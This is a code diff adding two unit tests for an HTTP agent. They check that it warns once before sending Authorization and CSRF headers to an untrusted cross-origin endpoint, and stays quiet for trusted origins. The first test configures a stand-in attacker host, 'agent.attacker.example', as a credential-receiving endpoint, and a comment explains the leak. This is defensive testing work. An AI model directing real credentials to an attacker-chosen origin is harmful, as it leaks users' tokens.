@@ -95,6 +95,68 @@ describe("createHttpAgent", () => {
     }
   });
 
+  it("warns before carrying host credentials to another origin", async () => {
+    // The endpoint is a plain HTML attribute. A page that builds it from a
+    // query parameter or from tenant-authored configuration hands an attacker
+    // the destination, and the browser will happily preflight a custom header
+    // and deliver the token to whoever answers. Nothing about that is visible
+    // to the operator today: the very first request carries the credential,
+    // before the user has done anything.
+    const agent = createHttpAgent({
+      endpoint: "https://agent.attacker.example/run/",
+      headers: { "X-CSRFToken": "rotating-value" },
+      getHeaders: () => ({ Authorization: "Bearer rotating-value" }),
+    });
+    const originalFetch = globalThis.fetch;
+    const originalWarn = console.warn;
+    const warnings: string[] = [];
+    console.warn = (message: string) => void warnings.push(message);
+    globalThis.fetch = (() => Promise.resolve(new Response("ok"))) as typeof fetch;
+    try {
+      await (agent as HttpAgent).fetch("https://agent.attacker.example/run/", { method: "POST" });
+    } finally {
+      globalThis.fetch = originalFetch;
+      console.warn = originalWarn;
+    }
+    expect(warnings).toHaveLength(1);
+    // Names the destination and both credential headers, so the warning is
+    // actionable rather than merely alarming.
+    expect(warnings[0]).toContain("https://agent.attacker.example");
+    expect(warnings[0]).toContain("X-CSRFToken");
+    expect(warnings[0]).toContain("Authorization");
+  });
+
+  it("reports a foreign origin once, and stays quiet about a trusted one", async () => {
+    // Once, because a per-request notice on a legitimate cross-origin
+    // deployment is noise that teaches the operator to filter the console —
+    // which would take the first notice down with it. And nothing at all for an
+    // origin the host has named, since that is the host confirming the
+    // destination rather than being surprised by it.
+    const foreign = createHttpAgent({
+      endpoint: "https://agent.example.net/run/",
+      getHeaders: () => ({ Authorization: "Bearer rotating-value" }),
+    });
+    const trusted = createHttpAgent({
+      endpoint: "https://agent.example.net/run/",
+      getHeaders: () => ({ Authorization: "Bearer rotating-value" }),
+      trustedOrigins: ["https://agent.example.net"],
+    });
+    const originalFetch = globalThis.fetch;
+    const originalWarn = console.warn;
+    const warnings: string[] = [];
+    console.warn = (message: string) => void warnings.push(message);
+    globalThis.fetch = (() => Promise.resolve(new Response("ok"))) as typeof fetch;
+    try {
+      await (foreign as HttpAgent).fetch("https://agent.example.net/run/", { method: "POST" });
+      await (foreign as HttpAgent).fetch("https://agent.example.net/run/", { method: "POST" });
+      await (trusted as HttpAgent).fetch("https://agent.example.net/run/", { method: "POST" });
+    } finally {
+      globalThis.fetch = originalFetch;
+      console.warn = originalWarn;
+    }
+    expect(warnings).toHaveLength(1);
+  });
+
   it("keeps existing request init fields when overlaying headers", async () => {
     const agent = createHttpAgent({
       endpoint: "/agent/",
